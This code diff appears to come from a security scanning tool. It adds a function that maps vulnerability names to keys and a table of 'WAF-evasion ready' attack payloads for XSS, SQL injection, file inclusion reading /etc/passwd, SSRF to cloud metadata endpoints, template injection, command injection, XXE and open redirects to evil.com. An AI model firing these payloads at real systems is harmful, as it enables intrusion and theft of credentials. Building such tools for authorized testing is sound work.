@@ -1464,6 +1464,58 @@ function mapSeverity(sev: string): Finding['severity'] {
   return 'info';
 }
 
+// Normalize varied finding-type labels into our canonical payload keys
+function normalizeType(t: string): string {
+  const s = (t || '').toLowerCase();
+  if (s.includes('sql')) return 'sqli';
+  if (s.includes('xss') || s.includes('cross-site script')) return 'xss';
+  if (s.includes('ssrf')) return 'ssrf';
+  if (s.includes('ssti') || s.includes('template')) return 'ssti';
+  if (s.includes('lfi') || s.includes('traversal') || s.includes('path')) return 'lfi';
+  if (s.includes('rce') || s.includes('command') || s.includes('cmdi')) return 'rce';
+  if (s.includes('idor') || s.includes('access control') || s.includes('authoriz')) return 'idor';
+  if (s.includes('xxe')) return 'xxe';
+  if (s.includes('redirect')) return 'open_redirect';
+  if (s.includes('cors')) return 'cors';
+  return s;
+}
+
+// Multiple deep-coverage payload variants per attack type (WAF-evasion ready)
+const GENERIC_PAYLOAD_VARIANTS: Record<string, string[]> = {
+  xss: [
+    '<img src=x onerror=alert(document.domain)>',
+    '"><svg/onload=confirm(1)>',
+    'javascript:alert(1)//',
+    "'-alert(1)-'",
+  ],
+  sqli: [
+    "' OR 1=1 UNION SELECT null,version()--",
+    "1 AND (SELECT 1 FROM (SELECT SLEEP(3))a)--",
+    "') OR ('1'='1",
+    "1' ORDER BY 50--",
+  ],
+  lfi: [
+    '../../../../etc/passwd',
+    '....//....//....//etc/passwd',
+    '/proc/self/environ',
+    'php://filter/convert.base64-encode/resource=index',
+  ],
+  ssrf: [
+    'http://127.0.0.1:80/admin',
+    'http://169.254.169.254/latest/meta-data/',
+    'http://localhost:6379/',
+    'gopher://127.0.0.1:11211/',
+  ],
+  ssti: ['{{7*7}}', '${7*7}', '#{7*7}', '<%= 7*7 %>'],
+  rce: ['; id', '| whoami', '`uname -a`', '$(cat /etc/passwd)'],
+  idor: ['', '0', '../1', 'admin'],
+  xxe: ['<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>'],
+  open_redirect: ['//evil.com', 'https:evil.com', '/\\evil.com'],
+  cors: [''],
+};
+
+
+
 // ===== Extract parameters from findings for heuristic generation =====
 function extractParametersFromFindings(findings: Finding[]): { name: string; location: string }[] {
   const params = new Set<string>();
